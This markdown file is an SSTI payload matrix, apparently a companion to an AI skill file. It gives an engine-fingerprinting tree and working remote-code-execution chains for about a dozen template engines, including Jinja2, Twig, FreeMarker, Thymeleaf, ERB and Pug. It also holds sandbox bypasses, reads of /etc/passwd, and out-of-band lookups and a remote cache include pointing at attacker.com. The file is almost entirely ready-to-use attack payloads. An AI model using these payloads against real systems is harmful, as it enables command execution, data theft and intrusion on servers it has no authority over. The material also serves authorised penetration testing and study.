# ENGINE_PAYLOADS.md — Extended SSTI Fingerprinting & Payload Matrix

> Companion to [SKILL.md](./SKILL.md). Contains per-engine payloads, fingerprint probes, and blind SSTI detection techniques.

---

## 1. ENGINE FINGERPRINTING DECISION TREE

```text
Send: {{7*7}}
├── 49 → Jinja2 or Twig?
│   └── Send: {{7*'7'}}
│       ├── 7777777 → Jinja2 (Python string multiplication)
│       └── 49      → Twig (PHP numeric cast)
├── {{7*7}} (literal) → Not Jinja2/Twig, try others
│   └── Send: ${7*7}
│       ├── 49 → FreeMarker, Velocity, or EL?
│       │   └── Send: ${class.getClass()}
│       │       ├── Works → Velocity
│       │       └── Error → Send: <#assign x=1>${x}
│       │           ├── 1     → FreeMarker
│       │           └── Error → Java EL / Thymeleaf
│       └── ${7*7} (literal) → try #{7*7}, <%= 7*7 %>, {7*7}
│           ├── #{7*7} → 49 → Pug/Jade or Ruby interpolation
│           ├── <%= 7*7 %> → 49 → ERB (Ruby) or EJS (Node.js)
│           └── {7*7} → 49 → Smarty (PHP)
└── Error/500 → Check error message for engine name (stack trace fingerprint)
```

---

## 2. JINJA2 (PYTHON)

### Information disclosure

```python
{{config}}
{{config.items()}}
{{request.environ}}
{{request.application.__globals__}}
{{self.__dict__}}
{{[].__class__.__base__.__subclasses__()}}
```

### RCE chains

```python
# Via config globals
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Via lipsum (Flask built-in)
{{lipsum.__globals__.os.popen('id').read()}}

# Via cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Via joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}

# Via namespace
{{namespace.__init__.__globals__.os.popen('id').read()}}

# Via __import__ through builtins
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# MRO subclass traversal (universal, no Flask dependency)
# Step 1: Find Popen class index
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in c.__name__ %}{{loop.index0}}{% endif %}
{% endfor %}
# Step 2: Execute (replace INDEX)
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}
```

### Sandbox bypass when `_` is blocked

```python
{{request|attr('\x5f\x5fclass\x5f\x5f')}}
{{''['\x5f\x5fclass\x5f\x5f']}}
{{config|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')}}

# Via request.args to smuggle blocked keywords
{{request.args.x.__class__}}&x=1
# Via request.cookies
{{request.cookies.get('\x5f\x5fclass\x5f\x5f')}}
```

### Sandbox bypass when `.` is blocked

```python
{{config['SECRET_KEY']}}
{{''['__class__']['__mro__'][1]}}
{{()|attr('__class__')}}
```

---

## 3. TWIG (PHP)

### Information disclosure

```twig
{{_self}}
{{_self.env}}
{{_context}}
{{app.request.server.all|join(',')}}
{{app.request.cookies.all|join(',')}}
```

### RCE chains

```twig
{# Twig 1.x #}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

{# Twig 1.x — system() #}
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("id")}}

{# Twig 2.x/3.x via filter map #}
{{['id']|map('system')|join}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|map('exec')|join}}

{# Twig 2.x — reduce with passthru #}
{{[0]|reduce('system','id')}}

{# Twig — setCache for remote include (Twig 1.x) #}
{{_self.env.setCache("ftp://attacker.com/")}}
{{_self.env.loadTemplate("shell")}}
```

---

## 4. FREEMARKER (JAVA)

### RCE via Execute

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
${ex("cat /etc/passwd")}
```

### RCE via ObjectConstructor

```freemarker
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign br=ob("java.io.BufferedReader",
  ob("java.io.InputStreamReader",
    ob("java.lang.ProcessBuilder",["id"]).start().getInputStream()))>
${br.readLine()}
```

### RCE via JythonRuntime (if Jython available)

```freemarker
<#assign jr="freemarker.template.utility.JythonRuntime"?new()>
<@jr>import os; os.system("id")</@jr>
```

### File read

```freemarker
<#assign file=object("java.io.File","/etc/passwd")>
<#assign reader=object("java.util.Scanner",file)>
${reader.useDelimiter("\\A").next()}
```

---

## 5. VELOCITY (JAVA)

### RCE chains

```velocity
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$chr.toChars($out.read())#end
```

### Alternative via ClassTool

```velocity
#set($proc=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
#set($reader=$class.inspect("java.io.BufferedReader").type.getDeclaredConstructor(
  $class.inspect("java.io.Reader").type).newInstance(
  $class.inspect("java.io.InputStreamReader").type.getDeclaredConstructor(
    $class.inspect("java.io.InputStream").type).newInstance($proc.getInputStream())))
$reader.readLine()
```

---

## 6. PEBBLE (JAVA)

```pebble
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
    .forName('java.lang.Runtime')
    .methods[6]
    .invoke(null,null)
    .exec(cmd)
    .inputStream
    .readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String')
    .getDeclaredConstructors()[0]
    .newInstance(([bytes]) ) }}
```

Alternative (shorter):
```pebble
{{ (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec("id") }}
```

---

## 7. MAKO (PYTHON)

```mako
${self.module.cache.util.os.popen('id').read()}
```

Alternative chains:
```mako
<%
  import os
  x = os.popen('id').read()
%>
${x}

<%
  import subprocess
  x = subprocess.check_output(['id'])
%>
${x}
```

Mako executes Python code directly within `<% %>` blocks — no sandbox to escape.

---

## 8. SLIM (RUBY)

```slim
#{`id`}
#{ system('id') }
#{ IO.popen('id').read }
#{ File.read('/etc/passwd') }
```

Slim and Haml support Ruby interpolation in `#{ }` blocks — same as ERB `<%= %>`:
```slim
= `id`
= system('whoami')
```

---

## 9. HANDLEBARS (NODE.JS)

Handlebars is "logic-less" by design, but prototype pollution or helper registration can enable RCE:

### RCE via constructor access

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Information leak

```handlebars
{{this}}
{{this.constructor}}
{{#each this}}{{@key}}: {{this}}{{/each}}
```

---

## 10. THYMELEAF (JAVA / SPRING)

### SpEL-based RCE

```java
// In fragment selector context
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

// With output capture
__${T(org.apache.commons.io.IOUtils).toString(
  T(java.lang.Runtime).getRuntime().exec(
    new String[]{"/bin/sh","-c","id"}).getInputStream()
)}__::.x

// In th:text or th:utext attribute
${T(java.lang.Runtime).getRuntime().exec('id')}

// URL-based injection (Spring view name resolution)
GET /doc/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

### Pre-processing expression `__${...}__`

Thymeleaf pre-processes `__${expr}__` before template rendering — this is the primary injection vector when view names are user-controlled.

### File read via SpEL

```java
${T(java.nio.file.Files).readString(T(java.nio.file.Path).of('/etc/passwd'))}
```

---

## 11. SMARTY (PHP)

```smarty
{system('id')}
{exec('id')}
{passthru('id')}
{php}system('id');{/php}

{# Smarty 3.x — {php} tags disabled by default, use: #}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id');?>",self::clearConfig())}

{# Information disclosure #}
{$smarty.version}
{$smarty.template}
{$smarty.server.SERVER_NAME}
```

---

## 12. ERB (RUBY)

```erb
<%= system('id') %>
<%= `id` %>
<%= exec('id') %>
<%= IO.popen('id').read %>
<%= open('|id').read %>
<%= %x(id) %>
<%= File.read('/etc/passwd') %>
<%= Dir.entries('/') %>
```

ERB has no sandbox — any Ruby code executes directly.

---

## 13. JADE / PUG (NODE.JS)

```pug
#{root.process.mainModule.require('child_process').execSync('id')}

- var x = root.process.mainModule.require('child_process').execSync('id').toString()
p= x

#{global.process.mainModule.require('child_process').execSync('id').toString()}
```

### File read

```pug
- var fs = root.process.mainModule.require('fs')
p= fs.readFileSync('/etc/passwd','utf8')
```

---

## 14. BLIND SSTI DETECTION

When template output is not directly visible in the response:

### Timing-based

```text
# Jinja2
{{range(10000000)|list}}                    → CPU spike / slow response
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('sleep 5',shell=True)}}

# Twig
{{['sleep 5']|map('system')}}

# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}

# Velocity
#set($x=''.class.forName('java.lang.Runtime').getRuntime().exec('sleep 5'))

# ERB
<%= sleep(5) %>

# Smarty
{system('sleep 5')}
```

Compare response time: baseline vs payload. 5+ second delta = confirmed blind SSTI.

### DNS-based (OOB)

```text
# Jinja2
{{lipsum.__globals__.os.popen('nslookup TOKEN.attacker.com').read()}}

# Twig
{{['nslookup TOKEN.attacker.com']|map('system')}}

# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nslookup TOKEN.attacker.com")}

# ERB
<%= `nslookup TOKEN.attacker.com` %>

# Pug/Jade
#{root.process.mainModule.require('child_process').execSync('nslookup TOKEN.attacker.com')}
```

DNS hit on Burp Collaborator / interactsh = confirmed blind SSTI with RCE.

### Error-based fingerprinting

Force a parser error — the error message or stack trace often names the engine:

```text
${{<%[%'"}}%\.
```

Parse errors from different engines:
- `jinja2.exceptions.TemplateSyntaxError` → Jinja2
- `Twig\Error\SyntaxError` → Twig
- `freemarker.core.ParseException` → FreeMarker
- `org.apache.velocity.exception.ParseErrorException` → Velocity
- `SyntaxError` with Pug stack → Pug/Jade
